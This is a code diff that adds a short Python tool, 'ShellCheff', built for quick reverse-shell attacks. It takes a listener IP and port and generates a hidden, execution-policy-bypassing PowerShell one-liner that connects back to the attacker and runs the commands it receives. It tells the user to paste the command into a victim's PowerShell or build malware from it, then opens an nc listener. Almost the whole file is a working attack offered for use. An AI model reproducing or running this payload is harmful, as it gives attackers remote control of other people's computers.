@@ -1,0 +1,49 @@
+#!/usr/bin/python3
+
+import sys
+import os
+import art
+import argparse
+
+parser = argparse.ArgumentParser(description="A program that allows you to make ReverseShell attacks FAST, incredibly FAST")
+
+parser.add_argument("-v","--version",action="version",version="0.1")
+
+parser.add_argument("-i","--ip",help="Listener IP")
+parser.add_argument("-p","--port",help="Listener PORT")
+
+args = parser.parse_args()
+
+if not args.ip:
+    raise Exception("Listener IP needed ...")
+
+if not args.port:
+    raise Exception("Listener PORT needed ...")
+    
+art.tprint("ShellCheff")
+
+ps_command = (
+    'powershell -NoP -NonI -W Hidden -Exec Bypass -Command '
+    '"$client=New-Object System.Net.Sockets.TCPClient(\'{}\',{});'
+    '$stream=$client.GetStream();'
+    '[byte[]]$bytes=0..65535|%{{0}};'
+    'while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{'
+    '$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);'
+    '$sendback=iex $data 2>&1 | Out-String;'
+    '$sendback2=$sendback+\'PS>\'; '
+    '$sendbyte=[Text.Encoding]::ASCII.GetBytes($sendback2);'
+    '$stream.Write($sendbyte,0,$sendbyte.Length);'
+    '$stream.Flush()}}"'
+).format(args.ip, args.port)
+
+
+print(ps_command)
+print("""
+            ^
+            |
+Use this command in Powershell (or you can create a malware) to get powershell SHELL
+
+Creating listener
+""")
+
+os.system("nc -lvnp {}".format(args.port))
